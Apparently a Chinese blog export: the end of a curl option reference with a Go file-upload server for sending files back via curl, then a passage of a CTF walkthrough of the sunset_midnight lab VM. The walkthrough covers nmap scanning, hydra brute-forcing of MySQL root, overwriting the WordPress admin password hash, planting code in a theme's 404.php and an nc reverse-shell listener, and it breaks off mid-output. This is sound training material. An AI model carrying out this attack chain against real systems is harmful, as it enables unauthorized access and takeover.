class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">curl --data-urlencode <span class="hljs-string">&#x27;comment=hello world&#x27;</span> https://google.com/login<br></code></pre></td></tr></table></figure><h2 id="e"><a href="#e" class="headerlink" title="-e"></a>-e</h2><p><code>-e</code> 参数用来设置 HTTP 的标头 <code>Referer</code>，表示请求的来源。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">curl -e <span class="hljs-string">&#x27;https://google.com?q=example&#x27;</span> https://www.example.com<br></code></pre></td></tr></table></figure><p><code>-H</code> 参数可以通过直接添加标头 <code>Referer</code>，达到同样效果。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">curl -H <span class="hljs-string">&#x27;Referer: https://google.com?q=example&#x27;</span> https://www.example.com<br></code></pre></td></tr></table></figure><h2 id="F"><a href="#F" class="headerlink" title="-F"></a>-F</h2><p><code>-F</code> 参数用来向服务器上传二进制文件。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">curl -F <span class="hljs-string">&#x27;file=@photo.png&#x27;</span> https://google.com/profile<br></code></pre></td></tr></table></figure><p>上面命令会给 HTTP 请求加上标头 <code>Content-Type: multipart/form-data</code>，然后将文件 <code>photo.png</code> 作为 <code>file</code> 字段上传。</p><p><code>-F</code> 参数可以指定 MIME 类型。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">curl -F <span class="hljs-string">&#x27;file=@photo.png;type=image/png&#x27;</span> https://google.com/profile<br></code></pre></td></tr></table></figure><p>上面命令指定 MIME 类型为 <code>image/png</code>，否则 curl 会把 MIME 类型设为 <code>application/octet-stream</code>。</p><h2 id="H"><a href="#H" class="headerlink" title="-H"></a>-H</h2><p><code>-H</code> 参数添加 HTTP 请求的标头。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">curl -d <span class="hljs-string">&#x27;&#123;&quot;login&quot;: &quot;emma&quot;, &quot;pass&quot;: &quot;123&quot;&#125;&#x27;</span> -H <span class="hljs-string">&#x27;Content-Type: application/json&#x27;</span> https://google.com/login<br></code></pre></td></tr></table></figure><h2 id="k"><a href="#k" class="headerlink" title="-k"></a>-k</h2><p><code>-k</code> 参数指定跳过 SSL 检测。</p><h2 id="L"><a href="#L" class="headerlink" title="-L"></a>-L</h2><p><code>-L</code> 参数会让 HTTP 请求跟随服务器的重定向。curl 默认不跟随重定向。</p><h2 id="o-x2F-O"><a href="#o-x2F-O" class="headerlink" title="-o&#x2F;-O"></a>-o&#x2F;-O</h2><p><code>-o</code> 参数将服务器的回应保存成文件，等同于 <code>wget</code> 命令。区别在于 <code>-o</code> 可以指定文件保存名</p><h2 id="u"><a href="#u" class="headerlink" title="-u"></a>-u</h2><p><code>-u</code> 参数用来设置服务器认证的用户名和密码。</p><h2 id="v"><a href="#v" class="headerlink" title="-v"></a>-v</h2><p><code>-v</code> 参数输出通信的整个过程，用于调试。</p><h2 id="x"><a href="#x" class="headerlink" title="-x"></a>-x</h2><p><code>-x</code> 参数指定 HTTP 请求的代理。如果没有指定代理协议，默认为 HTTP。</p><h2 id="X"><a href="#X" class="headerlink" title="-X"></a>-X</h2><p><code>-X</code> 参数指定 HTTP 请求的方法。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">curl -X POST https://www.example.com<br></code></pre></td></tr></table></figure><h2 id="使用不同的版本的http协议"><a href="#使用不同的版本的http协议" class="headerlink" title="使用不同的版本的http协议"></a>使用不同的版本的http协议</h2><p>默认1.0版本</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">curl --http1.1 https://www.example.com<br>curl --http2 https://www.example.com<br></code></pre></td></tr></table></figure><h2 id="使用不同的-ssl-版本访问"><a href="#使用不同的-ssl-版本访问" class="headerlink" title="使用不同的 ssl 版本访问"></a>使用不同的 ssl 版本访问</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">curl -1 https://www.example.com<br>curl -2 https://www.example.com<br>curl -3 https://www.example.com<br></code></pre></td></tr></table></figure><h2 id="使用不同的-ip-协议"><a href="#使用不同的-ip-协议" class="headerlink" title="使用不同的 ip 协议"></a>使用不同的 ip 协议</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">curl -4 https://www.example.com<br>curl -6 https://www.example.com<br></code></pre></td></tr></table></figure><h2 id="指定-dns-访问网站"><a href="#指定-dns-访问网站" class="headerlink" title="指定 dns 访问网站"></a>指定 dns 访问网站</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">curl --dns-servers 8.8.8.8 https://www.example.com<br></code></pre></td></tr></table></figure><h2 id="利用-curl-回传文件"><a href="#利用-curl-回传文件" class="headerlink" title="利用 curl 回传文件"></a>利用 curl 回传文件</h2><p>采用 golang 编写一个简单的获取文件上传的后端</p><figure class="highlight go"><figcaption><span>main.go文件</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">package</span> main<br> <br><span class="hljs-keyword">import</span> (<br><span class="hljs-string">&quot;flag&quot;</span><br><span class="hljs-string">&quot;go-upload/runserver&quot;</span><br>)<br> <br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> &#123;<br>filedir := flag.String(<span class="hljs-string">&quot;f&quot;</span>, <span class="hljs-string">&quot;&quot;</span>, <span class="hljs-string">&quot;保存路径&quot;</span>)<br>lport := flag.String(<span class="hljs-string">&quot;p&quot;</span>, <span class="hljs-string">&quot;8088&quot;</span>, <span class="hljs-string">&quot;运行端口&quot;</span>)<br>flag.Parse()<br><span class="hljs-keyword">if</span> *filedir != <span class="hljs-string">&quot;&quot;</span> &amp;&amp; *lport != <span class="hljs-string">&quot;&quot;</span> &#123;<br>runserver.Runserver(*filedir, *lport)<br>&#125; <span class="hljs-keyword">else</span> &#123;<br>flag.Usage()<br>&#125;<br>&#125;<br></code></pre></td></tr></table></figure><figure class="highlight go"><figcaption><span>root.go文件</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">package</span> runserver<br> <br><span class="hljs-keyword">import</span> (<br><span class="hljs-string">&quot;fmt&quot;</span><br><span class="hljs-string">&quot;github.com/gin-gonic/gin&quot;</span><br><span class="hljs-string">&quot;net/http&quot;</span><br>)<br> <br><span class="hljs-comment">/*</span><br><span class="hljs-comment">* @Author: A</span><br><span class="hljs-comment">* @Date:   2021/7/6 11:32</span><br><span class="hljs-comment"> */</span><br> <br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">Runserver</span><span class="hljs-params">(filedir <span class="hljs-type">string</span>, lport <span class="hljs-type">string</span>)</span></span> &#123;<br>r := gin.Default()<br>b := filedir<br>r.POST(<span class="hljs-string">&quot;/upload&quot;</span>, <span class="hljs-function"><span class="hljs-keyword">func</span><span class="hljs-params">(c *gin.Context)</span></span> &#123;<br>file, err := c.FormFile(<span class="hljs-string">&quot;file&quot;</span>)<br><span class="hljs-comment">//fmt.Println(file.Filename)</span><br>s := b + <span class="hljs-string">&quot;/&quot;</span> + file.Filename<br><span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> &#123;<br>c.String(<span class="hljs-number">500</span>, <span class="hljs-string">&quot;err&quot;</span>)<br>&#125;<br><span class="hljs-comment">// c.JSON(200, gin.H&#123;&quot;message&quot;: file.Header.Context&#125;)</span><br>err = c.SaveUploadedFile(file, s)<br><span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> &#123;<br>c.String(http.StatusOK, <span class="hljs-string">&quot;err&quot;</span>)<br>&#125;<br>c.String(http.StatusOK, <span class="hljs-string">&quot;ok&quot;</span>)<br>&#125;)<br>r.Run(<span class="hljs-string">&quot;:&quot;</span> + lport)<br>&#125;<br></code></pre></td></tr></table></figure><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs awk">curl -F <span class="hljs-string">&quot;file=@文件路径&quot;</span> http:<span class="hljs-regexp">//</span>localhost:<span class="hljs-number">8088</span>/upload<br><span class="hljs-comment">##上传成功会回显 ok</span><br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>knowledge_database</category>
      
      <category>tools</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>sunset_midnight 靶机</title>
    <link href="/2023/08/7478c51012fb.html"/>
    <url>/2023/08/7478c51012fb.html</url>
    
    <content type="html"><![CDATA[<h1 id="sunset-midnight-靶机"><a href="#sunset-midnight-靶机" class="headerlink" title="sunset_midnight 靶机"></a>sunset_midnight 靶机</h1><h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[~]<br>└─$ sudo nmap --min-rate 10000 -p- 192.168.56.132<br>Starting Nmap 7.94 ( https://nmap.org ) at 2023-07-27 08:17 EDT<br>Nmap scan report <span class="hljs-keyword">for</span> 192.168.56.132<br>Host is up (0.00018s latency).<br>Not shown: 65532 closed tcp ports (reset)<br>PORT     STATE SERVICE<br>22/tcp   open  ssh<br>80/tcp   open  http<br>3306/tcp open  mysql<br>MAC Address: 08:00:27:91:BF:42 (Oracle VirtualBox virtual NIC)<br><br>Nmap <span class="hljs-keyword">done</span>: 1 IP address (1 host up) scanned <span class="hljs-keyword">in</span> 8.90 seconds<br></code></pre></td></tr></table></figure><p>开放了 22, 80, 3306 端口，先试试 MySQL 有没有无密码登录，之所以先尝试，是因为过去有过使用 nmap 扫描的时候，被封了 IP，重启之后才能 MySQL 无密码登录</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[~]<br>└─$ mysql -uroot 192.168.56.132 <br>ERROR 2002 (HY000): Can\<span class="hljs-string">&#x27;t connect to local server through socket &#x27;</span>/run/mysqld/mysqld.sock<span class="hljs-string">&#x27; (2)</span><br><span class="hljs-string"></span><br><span class="hljs-string">┌──(kali㉿kali)-[~]</span><br><span class="hljs-string">└─$ mysql -uroot 192.168.56.132 -p</span><br><span class="hljs-string">Enter password: </span><br><span class="hljs-string">ERROR 2002 (HY000): Can\&#x27;</span>t connect to <span class="hljs-built_in">local</span> server through socket <span class="hljs-string">&#x27;/run/mysqld/mysqld.sock&#x27;</span> (2)<br></code></pre></td></tr></table></figure><p>搁置，先去看看别的信息吧</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[~]<br>└─$ sudo nmap -sT -sV -sC -O -p22,80,3306 192.168.56.132          <br>Starting Nmap 7.94 ( https://nmap.org ) at 2023-07-27 08:19 EDT<br>Nmap scan report <span class="hljs-keyword">for</span> 192.168.56.132<br>Host is up (0.00033s latency).<br><br>PORT     STATE SERVICE VERSION<br>22/tcp   open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)<br>| ssh-hostkey: <br>|   2048 9c:fe:0b:8b:8d:15:e7:72:7e:3c:23:e5:86:55:51:2d (RSA)<br>|   256 fe:eb:ef:5d:40:e7:06:67:9b:63:67:f8:d9:7e:d3:e2 (ECDSA)<br>|_  256 35:83:68:2c:33:8b:b4:6c:24:21:20:0d:52:ed:<span class="hljs-built_in">cd</span>:16 (ED25519)<br>80/tcp   open  http    Apache httpd 2.4.38 ((Debian))<br>|_http-title: Did not follow redirect to http://sunset-midnight/<br>|_http-server-header: Apache/2.4.38 (Debian)<br>| http-robots.txt: 1 disallowed entry <br>|_/wp-admin/<br>3306/tcp open  mysql   MySQL 5.5.5-10.3.22-MariaDB-0+deb10u1<br>| mysql-info: <br>|   Protocol: 10<br>|   Version: 5.5.5-10.3.22-MariaDB-0+deb10u1<br>|   Thread ID: 14<br>|   Capabilities flags: 63486<br>|   Some Capabilities: Speaks41ProtocolNew, FoundRows, DontAllowDatabaseTableColumn, Support41Auth, InteractiveClient, Speaks41ProtocolOld, SupportsTransactions, SupportsLoadDataLocal, LongColumnFlag, IgnoreSigpipes, IgnoreSpaceBeforeParenthesis, ODBCClient, ConnectWithDatabase, SupportsCompression, SupportsMultipleStatments, SupportsMultipleResults, SupportsAuthPlugins<br>|   Status: Autocommit<br>|   Salt: SmLrz0y6?xba?WvoGVZC<br>|_  Auth Plugin Name: mysql_native_password<br>MAC Address: 08:00:27:91:BF:42 (Oracle VirtualBox virtual NIC)<br>Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port<br>Device <span class="hljs-built_in">type</span>: general purpose<br>Running: Linux 4.X|5.X<br>OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5<br>OS details: Linux 4.15 - 5.8<br>Network Distance: 1 hop<br>Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel<br><br>OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .<br>Nmap <span class="hljs-keyword">done</span>: 1 IP address (1 host up) scanned <span class="hljs-keyword">in</span> 15.48 seconds<br></code></pre></td></tr></table></figure><p>汇总一下信息：Debian 操作系统，需要修改 hosts 文件，<code>robots.txt</code> 中有个目录 <code>/wp-admin/</code>，说明网站有 wordpress ，<code>mysql-info</code> 中有着 MySQL 的详细信息，猜测可能存在突破点。漏洞脚本扫描一下</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[~]<br>└─$ sudo nmap --script=vuln -p22,80,3306 192.168.56.132          <br>Starting Nmap 7.94 ( https://nmap.org ) at 2023-08-02 22:46 EDT<br>Nmap scan report <span class="hljs-keyword">for</span> sunset-midnight (192.168.56.132)<br>Host is up (0.00026s latency).<br><br>PORT     STATE SERVICE<br>22/tcp   open  ssh<br>80/tcp   open  http<br>|_http-csrf: Couldn\<span class="hljs-string">&#x27;t find any CSRF vulnerabilities.</span><br><span class="hljs-string">| http-wordpress-users: </span><br><span class="hljs-string">| Username found: admin</span><br><span class="hljs-string">|_Search stopped at ID #25. Increase the upper limit if necessary with &#x27;</span>http-wordpress-users.limit<span class="hljs-string">&#x27;</span><br><span class="hljs-string">|_http-stored-xss: Couldn\&#x27;</span>t find any stored XSS vulnerabilities.<br>|_http-dombased-xss: Couldn\<span class="hljs-string">&#x27;t find any DOM based XSS.</span><br><span class="hljs-string">| http-enum: </span><br><span class="hljs-string">|   /blog/: Blog</span><br><span class="hljs-string">|   /wp-login.php: Possible admin folder</span><br><span class="hljs-string">|   /wp-json: Possible admin folder</span><br><span class="hljs-string">|   /robots.txt: Robots file</span><br><span class="hljs-string">|   /readme.html: Wordpress version: 2 </span><br><span class="hljs-string">|   /: WordPress version: 5.4.2</span><br><span class="hljs-string">|   /feed/: Wordpress version: 5.4.2</span><br><span class="hljs-string">|   /wp-includes/images/rss.png: Wordpress version 2.2 found.</span><br><span class="hljs-string">|   /wp-includes/js/jquery/suggest.js: Wordpress version 2.5 found.</span><br><span class="hljs-string">|   /wp-includes/images/blank.gif: Wordpress version 2.6 found.</span><br><span class="hljs-string">|   /wp-includes/js/comment-reply.js: Wordpress version 2.7 found.</span><br><span class="hljs-string">|   /wp-login.php: Wordpress login page.</span><br><span class="hljs-string">|   /wp-admin/upgrade.php: Wordpress login page.</span><br><span class="hljs-string">|   /readme.html: Interesting, a readme.</span><br><span class="hljs-string">|_  /contact/: Potentially interesting folder</span><br><span class="hljs-string">3306/tcp open  mysql</span><br><span class="hljs-string">|_mysql-vuln-cve2012-2122: ERROR: Script execution failed (use -d to debug)</span><br><span class="hljs-string">MAC Address: 08:00:27:91:BF:42 (Oracle VirtualBox virtual NIC)</span><br><span class="hljs-string"></span><br><span class="hljs-string">Nmap done: 1 IP address (1 host up) scanned in 48.21 seconds</span><br></code></pre></td></tr></table></figure><p>结果中基本都是 wordpress 的常见目录，搜索一下 <code>mysql-info</code> 相关的信息找一找思路</p><p><img src="/pic/6bb459f8330e64c7f14090b3c71451bd_MD5.png"></p><p>也是一台靶机，里面提到了爆破的思路</p><h2 id="MySQL-密码爆破"><a href="#MySQL-密码爆破" class="headerlink" title="MySQL 密码爆破"></a>MySQL 密码爆破</h2><p>之前尝试空密码登录但是失败了，这里用 hydra 进行 MySQL 端口的密码爆破</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[~/Downloads/sunset_midnight]<br>└─$ sudo hydra -l root -P /usr/share/wordlists/rockyou.txt 192.168.56.132 mysql<br>[sudo] password <span class="hljs-keyword">for</span> kali: <br>Hydra v9.4 (c) 2022 by van Hauser/THC &amp; David Maciejak - Please <span class="hljs-keyword">do</span> not use <span class="hljs-keyword">in</span> military or secret service organizations, or <span class="hljs-keyword">for</span> illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).<br><br>Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2023-08-02 09:25:00<br>[INFO] Reduced number of tasks to 4 (mysql does not like many parallel connections)<br>[DATA] max 4 tasks per 1 server, overall 4 tasks, 14344399 login tries (l:1/p:14344399), ~3586100 tries per task<br>[DATA] attacking mysql://192.168.56.132:3306/<br>[3306][mysql] host: 192.168.56.132   login: root   password: robert<br>1 of 1 target successfully completed, 1 valid password found<br>[WARNING] Writing restore file because 1 final worker threads did not complete <span class="hljs-keyword">until</span> end.<br>[ERROR] 1 target did not resolve or could not be connected<br>[ERROR] 0 target did not complete<br>Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2023-08-02 09:25:14<br></code></pre></td></tr></table></figure><p>数据库的用户名和密码爆破得到了 <code>root:robert</code>，登录进去，查看有没有感兴趣的东西</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[~]<br>└─$ mysql -u root -h 192.168.56.132 -p<br>Enter password: <br>Welcome to the MariaDB monitor.  Commands end with ; or \g.<br>Your MariaDB connection <span class="hljs-built_in">id</span> is 14<br>Server version: 10.3.22-MariaDB-0+deb10u1 Debian 10<br><br>Copyright (c) 2000, 2018, Oracle, MariaDB Corporation Ab and others.<br><br>Type <span class="hljs-string">&#x27;help;&#x27;</span> or <span class="hljs-string">&#x27;\h&#x27;</span> <span class="hljs-keyword">for</span> <span class="hljs-built_in">help</span>. Type <span class="hljs-string">&#x27;\c&#x27;</span> to clear the current input statement.<br><br>MariaDB [(none)]&gt; show databases;<br>+--------------------+<br>| Database           |<br>+--------------------+<br>| information_schema |<br>| mysql              |<br>| performance_schema |<br>| wordpress_db       |<br>+--------------------+<br>4 rows <span class="hljs-keyword">in</span> <span class="hljs-built_in">set</span> (0.003 sec)<br><br>MariaDB [(none)]&gt; use wordpress_db<br>Reading table information <span class="hljs-keyword">for</span> completion of table and column names<br>You can turn off this feature to get a quicker startup with -A<br><br>Database changed<br>MariaDB [wordpress_db]&gt; <span class="hljs-keyword">select</span> * from wp_users;<br>+----+------------+------------------------------------+---------------+---------------------+------------------------+---------------------+---------------------+-------------+--------------+<br>| ID | user_login | user_pass                          | user_nicename | user_email          | user_url               | user_registered     | user_activation_key | user_status | display_name |<br>+----+------------+------------------------------------+---------------+---------------------+------------------------+---------------------+---------------------+-------------+--------------+<br>|  1 | admin      | $P<span class="hljs-variable">$BaWk4oeAmrdn453hR6O6BvDqoF9yy6</span>/ | admin         | example@example.com | http://sunset-midnight | 2020-07-16 19:10:47 |                     |           0 | admin        |<br>+----+------------+------------------------------------+---------------+---------------------+------------------------+---------------------+---------------------+-------------+--------------+<br>1 row <span class="hljs-keyword">in</span> <span class="hljs-built_in">set</span> (0.001 sec)<br></code></pre></td></tr></table></figure><p>发现了密码，尝试在线网站没结果，尝试 john 爆破五六分钟还是没结果就放弃了。那就先记录一下这个密码哈希值，然后我尝试了 UDF 提权的方法，但是写入失败，插件目录无法写入，尝试调用系统命令，但是调用的确实我本地 kali 的命令。</p><h2 id="修改数据库中的-wordpress-用户密码"><a href="#修改数据库中的-wordpress-用户密码" class="headerlink" title="修改数据库中的 wordpress 用户密码"></a>修改数据库中的 wordpress 用户密码</h2><p>那就只能考虑更换数据库中的 wordpress 用户密码，搜索找到了一个在线生成 wordpress 密码的网站</p><p><a href="http://web.chacuo.net/safewordpress">在线 生成wordpress密码、wordpress密码在线生成–查错网 (chacuo.net)</a></p><p><img src="/pic/4dd19bb86f745cd72c42c828d6ba51f7_MD5.png"></p><p>将结果复制下来，写入到数据库中</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs bash">MariaDB [wordpress_db]&gt; update wp_users SET user_pass=<span class="hljs-string">&#x27;$P$BxmtX6aP2R/qqkrwLmnN7qnjJ5z6Jg1&#x27;</span> <span class="hljs-built_in">where</span> user_login=<span class="hljs-string">&#x27;admin&#x27;</span>; <br>Query OK, 1 row affected (0.004 sec)<br>Rows matched: 1  Changed: 1  Warnings: 0<br><br>MariaDB [wordpress_db]&gt; <span class="hljs-keyword">select</span> * from wp_users;<br>+----+------------+------------------------------------+---------------+---------------------+------------------------+---------------------+---------------------+-------------+--------------+<br>| ID | user_login | user_pass                          | user_nicename | user_email          | user_url               | user_registered     | user_activation_key | user_status | display_name |<br>+----+------------+------------------------------------+---------------+---------------------+------------------------+---------------------+---------------------+-------------+--------------+<br>|  1 | admin      | $P<span class="hljs-variable">$BxmtX6aP2R</span>/qqkrwLmnN7qnjJ5z6Jg1 | admin         | example@example.com | http://sunset-midnight | 2020-07-16 19:10:47 |                     |           0 | admin        |<br>+----+------------+------------------------------------+---------------+---------------------+------------------------+---------------------+---------------------+-------------+--------------+<br>1 row <span class="hljs-keyword">in</span> <span class="hljs-built_in">set</span> (0.001 sec)<br></code></pre></td></tr></table></figure><h2 id="wordpress-后台-getshell"><a href="#wordpress-后台-getshell" class="headerlink" title="wordpress 后台 getshell"></a>wordpress 后台 getshell</h2><p>使用 <code>admin:123456</code> 登录 wordpress 成功</p><p><img src="/pic/1fed65b1176d98bd814c3870d0268172_MD5.png"></p><p>接下来就是常见思路了，修改主题的 404.php 文件，但是 update 的时候遇到了报错</p><figure class="highlight applescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs applescript">Unable <span class="hljs-keyword">to</span> communicate <span class="hljs-keyword">back</span> <span class="hljs-keyword">with</span> site <span class="hljs-keyword">to</span> check <span class="hljs-keyword">for</span> fatal errors, so <span class="hljs-keyword">the</span> PHP change was reverted. You will need <span class="hljs-keyword">to</span> upload your PHP <span class="hljs-built_in">file</span> change <span class="hljs-keyword">by</span> <span class="hljs-keyword">some</span> other means, such <span class="hljs-keyword">as</span> <span class="hljs-keyword">by</span> using SFTP.<br></code></pre></td></tr></table></figure><p>之后我尝试了上传 php 文件、将 php 文件压缩后上传到插件、将包含 php 文件的目录压缩后上传到主题，但是由于 wordpress 版本较高，都遇到了各种问题而没有成功。</p><p>将报错信息谷歌一下，在第一个链接中找到了可能的解决办法</p><p><a href="https://stackoverflow.com/questions/52671255/wordpress-editor-not-updating-files-unable-to-communicate-back-with-site-to-che">php - WordPress Editor not updating files: Unable to communicate back with site to check for fatal errors - Stack Overflow</a></p><p><img src="/pic/24c9ee7e18e4d640d6688c87039cdb88_MD5.png"></p><p>尝试安装插件 <code>https://wordpress.org/plugins/theme-editor/#installation</code> 安装后修改 404.php 成功</p><p><img src="/pic/3e107a721553ee6436263c977e32d3cd_MD5.png"></p><p>开启监听后访问链接 <code>http://sunset-midnight/wp-content/themes/twentyseventeen/404.php</code></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[~/Downloads/sunset_midnight]<br>└─$ sudo nc -lvnp 443             <br>[sudo] password <span class="hljs-keyword">for</span> kali: <br>listening on [any] 443 ...<br>connect to 